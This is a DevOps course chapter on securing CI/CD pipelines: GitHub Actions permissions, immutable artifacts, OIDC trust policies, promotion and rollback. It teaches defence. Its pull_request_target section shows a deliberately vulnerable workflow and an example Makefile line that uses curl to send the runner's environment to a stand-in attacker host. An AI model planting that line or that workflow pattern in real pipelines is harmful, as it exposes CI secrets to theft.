# T-DEV-03-P — Professional Engineering

*Chapter: [T-DEV-03 — CI/CD and Build Automation](README.md) · Part 1 — DevOps Engineering*

<a id="t-dev-03-p"></a>
#### T-DEV-03-P — Professional Engineering

## Why this level exists

At Intermediate level the pipeline works: it validates changes, builds once and records a digest. Professional practice asks a harder set of questions about the same pipeline:

- Who, or what, is allowed to change production, and how is that decision enforced rather than merely documented?
- What credentials does the pipeline hold, how long do they live, and what could someone do with them if the pipeline were compromised?
- When a release goes wrong at 02:00, how quickly and how *safely* can it be undone?
- Can the team trust the pipeline itself: does it fail for the right reasons, and does it keep working when a dependency does not?

This section treats the pipeline as **a privileged production system**, designed with the same care as the service it delivers. If the vocabulary of stages, digests and gates is unfamiliar, review [T-DEV-03-I](T-DEV-03-I%20Intermediate.md#t-dev-03-i) first.

## Treat CI as a privileged system

A pipeline holds credentials and can change production. That makes it an attractive target, and the simplest attacker model is a hostile pull request that tries to read secrets or gain write access. Design every workflow by asking: *if the code this job runs were written by an attacker, what could it reach?*

| Control | Intent | What happens without it |
| --- | --- | --- |
| `permissions: contents: read` on validation workflows | Default deny for writes | A compromised test step can push code, edit releases or modify issues |
| No `pull_request_target` combined with checkout of untrusted code | Avoid privileged context plus attacker-controlled code | Attacker code runs with the base repository's secrets and write token |
| Secrets not exposed to fork pull requests | Prevent trivial theft | A fork's workflow prints the secret into a log it controls |
| Ephemeral hosted runners for untrusted code | Avoid persistent self-hosted contamination | One job leaves a payload that the next job (maybe a trusted one) runs |
| Separate release workflow with environment protection | Publish only from trusted refs | Any branch can publish |
| Pin third-party actions by commit SHA | Reduce action-supply-chain risk | A tag is moved to malicious code and every consumer runs it |
| Code owners and review on `.github/workflows/` | The pipeline definition is privileged code | An unreviewed workflow edit rewrites the rules |

### The `pull_request_target` trap, step by step

GitHub offers two similar triggers with very different security properties.

- `pull_request` runs the workflow as defined **in the pull request's merge commit**, with a read-only token and *no secrets* when the pull request comes from a fork.
- `pull_request_target` runs the workflow as defined **on the base branch**, with a token that may have write access and with secrets available. It exists so that trusted automation (labelling, commenting) can act on fork pull requests.

The danger arises when a `pull_request_target` workflow *checks out and runs code from the pull request*:

```yaml
# DANGEROUS: privileged context + attacker-controlled code
on: pull_request_target
jobs:
  test:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # the attacker's code
      - run: make test                                     # the attacker's Makefile, with your secrets
```

A fork's `Makefile` can say `make test: ; curl -d "$(env)" https://attacker.example`. The workflow file is yours and trusted; the *thing it runs* is not. The safe options, in order of preference:

1. Use `pull_request` for anything that builds or runs the contribution.
2. If privileged follow-up is needed (for example, posting a comment with results), split it: an unprivileged `pull_request` workflow produces results as an artifact; a separate `workflow_run` workflow, which runs from the default branch, treats that artifact as **untrusted data** (validates it, never executes it) and posts the comment.
3. If you must check out fork code under `pull_request_target`, never run it with secrets and never execute anything from it; use it only as input to a pure analysis you control.

### Permission matrix: write it down

Keep a table in the repository that states, for each workflow, what can happen. Reviewers can then see when a change widens exposure.

| Workflow | Trigger | Token scopes | Secrets or identity | Runs untrusted code? | Output |
| --- | --- | --- | --- | --- | --- |
| `validate` | `pull_request` | `contents: read` | none | Yes | Check result, reports |
| `release` | `push` to `main` | `contents: read`, `packages: write`, `id-token: write` | Environment `release` (OIDC role) | No | Image digest, evidence |
| `promote-staging` | `workflow_dispatch` or merge of promotion file | `contents: read`, `id-token: write` | Environment `staging` | No | Deployed digest |
| `promote-production` | Same, plus approval | `contents: read`, `id-token: write` | Environment `production` (required reviewers) | No | Deployed digest |
| `triage-labeler` | `pull_request_target` | `pull-requests: write` | none | **Never checked out** | Labels |

Two rules make the matrix meaningful: *no workflow may widen its permissions without review by a code owner*, and *the repository-wide default token permission is set to read-only*, so a workflow that forgets a `permissions:` block gets the safe default.

### Scoping permissions per job

The `permissions:` block can be set at workflow level and overridden per job. The most useful pattern: **start the workflow with nothing, and grant each job only what it uses.**

```yaml
permissions: {}                     # workflow default: nothing

jobs:
  test:
    runs-on: ubuntu-24.04
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@v4
      - run: make test

  publish:
    needs: test
    runs-on: ubuntu-24.04
    environment: release
    permissions:
      contents: read
      packages: write
      id-token: write
    steps:
      - run: echo "only this job can publish"
```

A step injected into `test` by a malicious dependency now cannot publish, because the job's token cannot.

## Immutable artifacts

The most valuable property of a mature pipeline is **immutability**: once an artifact has been built and tested, *that exact artifact* is what moves through every environment. Nothing is rebuilt, retagged or patched in place.

**Why it matters.** Consider what is lost when you rebuild for each environment:

| If you rebuild for production | Then |
| --- | --- |
| Dependencies are re-resolved | A new transitive version may appear between staging and production |
| The base image is re-pulled | A new base layer ships, never tested in staging |
| Build timestamps and ordering differ | Hashes differ; "same commit" no longer implies "same artifact" |
| Build environment differs | A fault in one runner affects only one environment |

In each case what you tested is not what you shipped. Immutability makes "tested in staging" mean something about production.

**How to implement it.**

1. **Identify artifacts by content digest**, never by a movable tag. Use tags as human-readable aliases only, and treat them as non-authoritative.
2. **Make the registry enforce it.** Where supported, enable tag immutability so a published tag cannot be overwritten; restrict who may delete or push.
3. **Record the digest once, where decisions use it.** The release job writes `commit → digest → run URL`; every later stage takes the digest as input.
4. **Make environment differences configuration, not build.** The artifact reads environment-specific values at runtime. If you find yourself building different images per environment, the difference belongs in configuration.
5. **Keep rollback targets alive.** A retention policy that deletes images older than a month deletes your rollback path. Retain at least the digests currently deployed, and the previous several releases per environment.

**What immutability does not give you.** A digest guarantees *sameness*, not *goodness*. A vulnerable or malicious artifact is just as immutable. Immutability is the base on which scanning, signing and approval make sense, because those decisions attach to a specific digest that cannot change underneath them.

## A trusted release workflow

Build once, push, capture the digest, write evidence, and attach signed provenance (what that provenance does and does not prove is the subject of the Expert level):

```yaml
name: release
on:
  push:
    branches: [main]

permissions: {}

jobs:
  release:
    runs-on: ubuntu-24.04
    environment: release
    permissions:
      contents: read
      id-token: write       # to request an OIDC token (also used for attestations)
      packages: write       # to push the image
      attestations: write   # to store build provenance
    outputs:
      digest: ${{ steps.build.outputs.digest }}
    steps:
      - uses: actions/checkout@v4
      - uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}
      - id: build
        uses: docker/build-push-action@v6
        with:
          push: true
          tags: ghcr.io/example-org/orders-api:${{ github.sha }}
          provenance: true
          sbom: true
      - uses: actions/attest-build-provenance@v2
        with:
          subject-name: ghcr.io/example-org/orders-api
          subject-digest: ${{ steps.build.outputs.digest }}
          push-to-registry: true
      - name: Record evidence
        env:
          DIGEST: ${{ steps.build.outputs.digest }}
        run: |
          printf '%s %s %s\n' "$GITHUB_SHA" "$DIGEST" \
            "$GITHUB_SERVER_URL/$GITHUB_REPOSITORY/actions/runs/$GITHUB_RUN_ID" >> release-evidence.txt
      - uses: actions/upload-artifact@v4
        with: { name: release-evidence, path: release-evidence.txt, retention-days: 90 }
```

For every release, keep: commit SHA, registry digest, workflow run URL, and scan or SBOM output *for that digest*. These four items turn a future incident from archaeology into a lookup.

## Approval and promotion

Between "built" and "running in production" are decisions. A professional pipeline makes each decision explicit, recorded and tied to a digest.

**Promotion is a change of state, not of content.** Moving a digest from staging to production changes *where it runs*, not *what it is*. That distinction lets you attach approvals to the move.

| Promotion step | Evidence that must exist | Who or what decides |
| --- | --- | --- |
| Build → candidate | Passing validation on the commit; digest and provenance recorded | The release workflow, automatically |
| Candidate → staging | Scan with no unwaived critical findings; reference passes the format guard | Automatic, by policy |
| Staging → production | Smoke tests passed on staging for this digest; change record linked; approval by someone other than the author | A protected environment with required reviewers |

**A promotion workflow.** Here the digest is a typed input, validated before use, and the production job runs against a protected environment:

```yaml
name: promote
on:
  workflow_dispatch:
    inputs:
      digest:
        description: "Image digest to promote (sha256:...)"
        required: true

permissions: {}

concurrency:
  group: promote-${{ github.workflow }}
  cancel-in-progress: false          # never cancel a deployment half-way

jobs:
  verify:
    runs-on: ubuntu-24.04
    permissions: { contents: read, id-token: write, packages: read }
    steps:
      - name: Validate input shape
        env:
          DIGEST: ${{ inputs.digest }}
        run: |
          printf '%s' "$DIGEST" | grep -Eq '^sha256:[0-9a-f]{64}$' || { echo "invalid digest"; exit 1; }
      # Next: verify that this digest was built by the release workflow (see the Expert level),
      # and that scan results for it are within policy.

  staging:
    needs: verify
    runs-on: ubuntu-24.04
    environment: staging
    permissions: { contents: read, id-token: write }
    env:
      DIGEST: ${{ inputs.digest }}
    steps:
      - run: echo "deploy $DIGEST to staging, then run smoke tests"

  production:
    needs: staging
    runs-on: ubuntu-24.04
    environment: production           # required reviewers pause the job here
    permissions: { contents: read, id-token: write }
    env:
      DIGEST: ${{ inputs.digest }}
    steps:
      - run: echo "deploy $DIGEST to production"
```

Note the habits. The digest enters through an environment variable (never interpolated directly into a script, even in later jobs) and is validated against an exact pattern before anything else touches it; the production job cannot start until the environment's reviewers approve; and `cancel-in-progress: false` means a second promotion queues rather than killing the first mid-way.

(The `echo` lines stand in for your deployment mechanism: a controller update, a helm release, a cloud API call. The *structure* is what this example teaches.)

## Protected environments

An **environment** is a named deployment target in the CI platform with its own rules and secrets. It is the point at which "this job wants to deploy" meets "the organisation's policy about who may let it".

Typical protections, and what each is for:

| Protection | What it enforces | Limitation to remember |
| --- | --- | --- |
| Required reviewers | A named person or team must approve before the job starts | Enable "prevent self-review" so the author cannot approve their own change; reviewers must be a group that is actually available |
| Deployment branch rules | Only the protected branch (or release tags) can deploy | A wildcard rule such as `*` defeats it |
| Environment-scoped secrets and identities | Credentials exist only inside the environment | A job that does not name the environment cannot see them |
| Wait timer | A delay allowing a window to cancel | A delay is not a review; do not use it as one |
| Deployment history | Who approved which deployment, when | Only useful if someone reads it, for example during review of incidents |

Environment protections are only as strong as the **branch and workflow-file protections around them**. If anyone can edit the workflow on a branch and the environment allows deployments from any branch, the approval can be bypassed by changing which environment the job names or which branch it runs from. That is why code owners on workflow files and a restrictive deployment-branch rule are part of the same design.

If your plan or platform edition cannot enforce a control (for example, required reviewers on environments in a private repository on a lower tier), **write the gap down** along with the compensating control, such as a manual change-record check or a second pipeline that verifies approval, and a review date.

## Short-lived cloud credentials with OpenID Connect

A stored cloud access key in a CI secret is a standing risk: it does not expire, it is usable from anywhere, and it is copied into every place the secret is shared. **OpenID Connect (OIDC)** replaces it with a per-run identity.

**The mechanism, in order:**

1. The CI platform signs a short-lived **identity token** (a JSON Web Token) for a specific run. It contains claims: the repository, the ref or environment, the workflow, the audience.
2. The job sends the token to the cloud provider's token service.
3. The cloud provider has been configured to *trust* the CI platform as an identity provider, and to map specific claim values to a role.
4. If the claims match the role's trust policy, the provider returns temporary credentials that expire in minutes to hours.

The security lives in step 3. A trust policy that says "any token from this CI platform may assume this role" lets *anyone's repository* on that platform assume your role. The policy must constrain the **subject** (`sub`) and the **audience** (`aud`) at least:

```json
{
  "Effect": "Allow",
  "Principal": { "Federated": "arn:aws:iam::<account>:oidc-provider/token.actions.githubusercontent.com" },
  "Action": "sts:AssumeRoleWithWebIdentity",
  "Condition": {
    "StringEquals": {
      "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
      "token.actions.githubusercontent.com:sub": "repo:example-org/orders-api:environment:production"
    }
  }
}
```

Reading the `sub` value: it names one repository and one **environment**. Because the environment has required reviewers and branch rules, *the cloud's trust inherits the platform's approval*. A job that is not running in the `production` environment gets a token with a different `sub` and cannot assume the role. Compare:

| `sub` condition | What can assume the role | Judgement |
| --- | --- | --- |
| `repo:example-org/*` | Any repository in the organisation, any branch | Too broad: a low-risk repository can reach production |
| `repo:example-org/orders-api:*` | Any branch, tag or pull request in one repository | Too broad: untrusted branches included |
| `repo:example-org/orders-api:ref:refs/heads/main` | Runs on `main` only | Reasonable; ties trust to a protected branch |
| `repo:example-org/orders-api:environment:production` | Jobs in the protected environment | Strongest of these; inherits approvals |

Using the role in a workflow:

```yaml
jobs:
  deploy:
    runs-on: ubuntu-24.04
    environment: production
    permissions:
      id-token: write          # permission to request the OIDC token
      contents: read
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::<account>:role/orders-api-deploy-production
          aws-region: eu-west-1
      - run: aws sts get-caller-identity   # prints the assumed role: useful to prove which identity ran
```

Two further professional habits: give each environment its **own role** with the minimum permissions its deployment needs (a staging role must not be able to touch production resources), and **log which identity performed each deployment**, so cloud audit logs can be correlated with workflow runs.

OIDC does not make a compromised job harmless: during the run, the temporary credentials are usable by whatever code is running in that job. It shrinks the *window* and the *reach* of a theft; it does not remove the need to keep untrusted code out of privileged jobs.

## Reusable pipelines

Once one service has a working pipeline, the second should not copy it. A **reusable workflow** (`workflow_call`) or shared template captures the common steps:

```yaml
# .github/workflows/build-test.yml in a shared repository
on:
  workflow_call:
    inputs:
      python-version: { type: string, default: "3.12" }
permissions: {}
jobs:
  build-test:
    runs-on: ubuntu-24.04
    permissions: { contents: read }
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with: { python-version: "${{ inputs.python-version }}" }
      - run: pip install -r requirements.txt && python -m pytest -q
```

A consumer calls it with `uses: example-org/shared-workflows/.github/workflows/build-test.yml@<commit-sha>`. Governance for shared workflows matters more than the syntax:

- **Version and pin.** Consumers reference a commit or immutable release tag; changes arrive through a reviewed update pull request, not automatically.
- **Test the template itself.** A change to a shared workflow affects every service. Keep a small sample repository whose pipeline exercises the template, and run it on changes to the template.
- **Define a change policy.** Breaking changes get a deprecation notice and a window; security fixes may override the window.
- **Beware over-abstraction.** If a shared workflow needs twelve inputs to cover every team's needs, it has become a bad programming language. Prefer a small, opinionated template plus the ability to drop to a custom pipeline.
- **Permissions stay visible.** A caller's token permissions cap what the called workflow can do; keep that explicit in the caller.

## Deployment strategies and what the pipeline owes them

A **deployment strategy** is the way new code replaces old in an environment. Pipelines must provide the right signals and controls for each.

| Strategy | How it works | Rollback speed | Cost and complexity | Needs from the pipeline |
| --- | --- | --- | --- | --- |
| Recreate | Stop old, start new | Slow, includes downtime | Lowest | A maintenance window |
| Rolling | Replace instances gradually | Medium: roll forward or back through the same process | Low | Readiness checks that reflect real health |
| Blue/green | Run the new version beside the old; switch traffic | Fast: switch back | Double capacity during switch | A traffic switch that is tested; plan for data compatibility |
| Canary | Send a small fraction of traffic to the new version, compare, expand | Fast for the canary slice | Needs traffic management and metrics | A comparison signal and an abort threshold |
| Feature flags | Deploy dark; enable per cohort | Fastest: flip the flag | Needs flag hygiene | A flag system with audit and expiry |

A strategy is only as real as the **signal** that drives it. A rolling update with a readiness probe that always reports "ready" is a fast outage. A "canary" with no comparison metric and no automatic abort is simply a slow rolling update. State, for each service: *what do we measure, what threshold aborts, and who or what acts on it?*

**A worked canary decision.** Suppose a service handles steady traffic and the team defines: error rate on the canary must stay within a stated margin of the baseline over a fixed observation window, and median latency must not degrade beyond an agreed bound. The pipeline (or a controller) increases the canary share in steps; at each step it compares the canary to the baseline *at the same time* (not to last week). If either threshold is breached, it returns traffic to the baseline and marks the release failed. The team chooses the margins and windows from its own service-level objectives; those numbers are decisions, not defaults.

**Database changes break all of these.** A rollback of application code cannot undo a destructive schema change. Use **expand and contract**: first add the new structure in a backward-compatible way and deploy code that works with both; later, when the old code is gone and verified unnecessary, remove the old structure. Migrations that drop or rewrite data are a separate release with its own approval.

## Rollback

Rollback is a feature that you design and rehearse, not a button you hope exists.

**With immutable artifacts, rollback is promotion in reverse:** deploy the previous known-good digest. No rebuild, no waiting for a new pipeline to pass, no new artifact that nobody has tested.

```text
# deploy/orders-api/image-ref.txt
-registry.example.com/orders-api@sha256:7a2d...41bc     # bad release
+registry.example.com/orders-api@sha256:3f1c...e9a0     # previous known-good digest
```

**What makes rollback hard, and what to do about it:**

| Obstacle | Why it bites | Mitigation |
| --- | --- | --- |
| Previous artifact deleted | Retention policy removed it | Retain deployed and recent digests |
| Incompatible data change | New code wrote data old code cannot read | Expand/contract; flags; compatibility tests across N and N-1 |
| External side effects | Emails sent, payments captured, messages published | Idempotency; feature flags; accept that some effects cannot be undone |
| Rollback path untested | The first time you use it is during an incident | Rehearse in staging on a schedule; time it |
| Rollback needs the broken pipeline | The pipeline is the thing that failed | A documented break-glass path with extra logging and an after-action review |
| Roll forward is faster | A tiny fix is quicker than a revert | Decide in advance who may choose, and under what time limit |

A rollback runbook should state: how to decide (error budget, severity), how to execute (exact command or workflow, expected duration), who approves in an emergency, how to verify recovery (which signals), and what to write down afterwards.

## Pipeline reliability

If developers cannot trust the pipeline, they route around it. The pipeline is a product with users, so give it reliability goals.

**Measure.** Keep a small, honest dashboard: median and 95th-percentile time from push to result, queue time, failure rate split by cause (code, test flake, infrastructure), re-run rate, and deployment frequency and recovery time. Without causes, "the pipeline is flaky" is an argument rather than a fact.

**Design for failure of dependencies.** Package registries, base-image registries and the CI platform itself fail. Decide in advance:

- Which dependencies can be **mirrored or cached** inside your own network?
- What is the **break-glass deployment** path if the CI platform is down, and who may use it?
- Which jobs may **retry automatically** (network downloads, with backoff and a count) and which must not (anything that changes state, unless it is idempotent)?

**Make deployment steps idempotent.** Re-running a step should leave the system in the same state as running it once. Idempotence makes retries safe and recovery from a half-finished deploy possible.

**Control concurrency.** Serialise deployments to the same environment (`concurrency` with `cancel-in-progress: false`), and cancel superseded *validation* runs (with `cancel-in-progress: true`). Confusing the two is a common error: cancelling a half-finished deployment can leave an environment in an unknown state.

**Set timeouts everywhere.** A job without a timeout can hold a runner for the platform's maximum. Timeouts convert hangs into alerts.

**Manage the pipeline's own change.** Changes to workflows go through review; upgrades of shared actions and runner images go through pull requests that run the pipeline against a sample project; a quarterly review removes dead jobs and re-verifies that controls still work.

## Merge gate design

Combine **reviews** with **required checks**. At minimum, required checks should include validation, policy and promotion verification, and each must be a job that always reports (the gate pattern from Intermediate). Require review from code owners on workflow files, deployment configuration and anything under the permission matrix. If the plan cannot enforce a gate (for example, a ruleset feature unavailable on the current tier), **document the gap, the compensating control and an owner**, and revisit the decision when circumstances change.

## Decision guide

| You need to… | Start by… | Avoid… |
| --- | --- | --- |
| Gate merges | An always-running required check | Path filters without a resolving gate |
| Trust an image | Registry digest plus commit plus run URL | `:latest` or rebuild per environment |
| Handle fork PRs | Read-only validation, no secrets | `pull_request_target` with untrusted checkout |
| Promote | A script or workflow with tests: one `@sha256:` reference | Tag-only references |
| Authenticate to a cloud | OIDC with a narrow `sub` and `aud` | Stored long-lived access keys |
| Approve production | A protected environment with required reviewers and prevent-self-review | Approvals by chat message with no record |
| Roll back | Promote the previous digest, rehearsed | A rebuild during the incident |
| Debug CI | Classify the fault using logs | Re-running until green |
| Reuse | A working simple pipeline, then a callable workflow pinned by commit | Abstracting before anything works |
| Run a canary | A defined metric, threshold and abort action | Calling a slow rolling update a canary |

## Knowledge consolidation

- A pipeline is a **privileged system**; design each workflow for the worst code it might run.
- `pull_request_target` plus untrusted checkout is the textbook way to hand an attacker your secrets.
- **Immutable artifacts**, identified by digest, make "tested" and "shipped" the same thing.
- **Promotion** moves a digest between states and is where approvals and evidence attach.
- **OIDC** replaces stored keys with per-run identity, but the trust policy's `sub` and `aud` constraints are where the security actually is.
- A deployment strategy is only real when it has a **signal** and an **automatic or documented abort**.
- Rollback is **rehearsed promotion in reverse**; data changes are what make it hard.
- The pipeline needs its own **reliability measures**; a pipeline nobody trusts will be bypassed.

## Exercises

**Exercise 1 — Permission matrix.** Inventory every workflow in a practice or real repository. Build the matrix (trigger, token scopes, secrets or identities, runs untrusted code?, output). Find two places where permissions could be tightened and tighten them.

**Exercise 2 — Defuse the dangerous trigger.** Create a disposable repository with the `pull_request_target` workflow shown above, a harmless fake secret, and a fork (or a simulated pull-request branch) whose `Makefile` echoes an environment variable *name* only, not a value. Demonstrate that the privileged context reaches the attacker's code, then redesign the workflow to be safe using either the `pull_request` trigger or the split-workflow pattern.

**Exercise 3 — Narrow a trust policy.** Given the trust policies in the table of `sub` conditions, rank them by blast radius. Then write the policy for a staging role that should be usable by any branch of one repository but must not be able to touch production resources. Explain what you would test to prove it.

**Exercise 4 — Promotion and rollback drill.** Build a promotion workflow with a protected environment and a digest guard. Promote digest A to staging; then promote digest B; then roll back to A using only the workflow. Time each step and note what you had to look up.

**Exercise 5 — Design a canary.** For a service you know, specify the baseline signal, canary signal, comparison method, observation window, abort threshold and who or what acts on a breach. State at least two things this design cannot detect.

**Solution notes (Exercise 1).** Common findings: validation workflows with default write permissions (fix: set `permissions: {}` at workflow level and `contents: read` per job); a release workflow granting `id-token: write` to jobs that never use OIDC; secrets defined at repository level rather than environment level. Tighten by moving secrets into environments and granting `packages: write` only to the publish job. Record the matrix in the repository and require code-owner review for it.

**Solution notes (Exercise 2).** The demonstration should show that the job running fork code can read the environment (print variable *names* and confirm presence; do not print values even of a fake secret into shared logs as a habit). The safe redesign: switch to `pull_request`, where secrets are not available to forks and the token is read-only. If a comment with results is needed, produce a results artifact in the unprivileged workflow and consume it from a `workflow_run` workflow that treats it as data (parse a fixed schema, never execute). A frequent mistake in the redesign is to keep the privileged trigger and "just not run anything", then add a step later that does.

**Solution notes (Exercise 3).** Ranking from widest to narrowest: organisation wildcard, repository wildcard, `ref:refs/heads/main`, environment-bound. For staging: `sub` equal to `repo:example-org/orders-api:environment:staging` is the clean answer if staging is an environment; if any branch must be allowed, a `StringLike` on `repo:example-org/orders-api:*` is the broadest acceptable form, **combined with** a role whose permissions cannot reach production resources (separate accounts or at minimum separate resource policies). Tests: attempt to assume the *production* role from a staging-environment job (must fail); attempt to assume staging from another repository (must fail); attempt to read a production resource with the staging credentials (must be denied).

**Solution notes (Exercise 4).** Expect the first promotion to require the most look-ups (inputs, environment names); the rollback should be faster because it reuses the same workflow with the earlier digest. If the rollback required a rebuild or a change to the application repository, your design couples rollback to the build; separate them. Record the time: it is your baseline recovery time for this path, which you can compare to your service's objectives.

**Solution notes (Exercise 5).** A credible answer names metrics a user would feel (error responses and latency for a request type), compares canary and baseline concurrently, uses a window long enough to include normal variation, and states the abort action (route traffic back, mark release failed, notify owner). What it cannot detect: slow-burn faults such as memory growth beyond the window, errors confined to rare request types that the canary slice does not include, and data problems visible only after a later job runs. Naming these limits is part of the design.
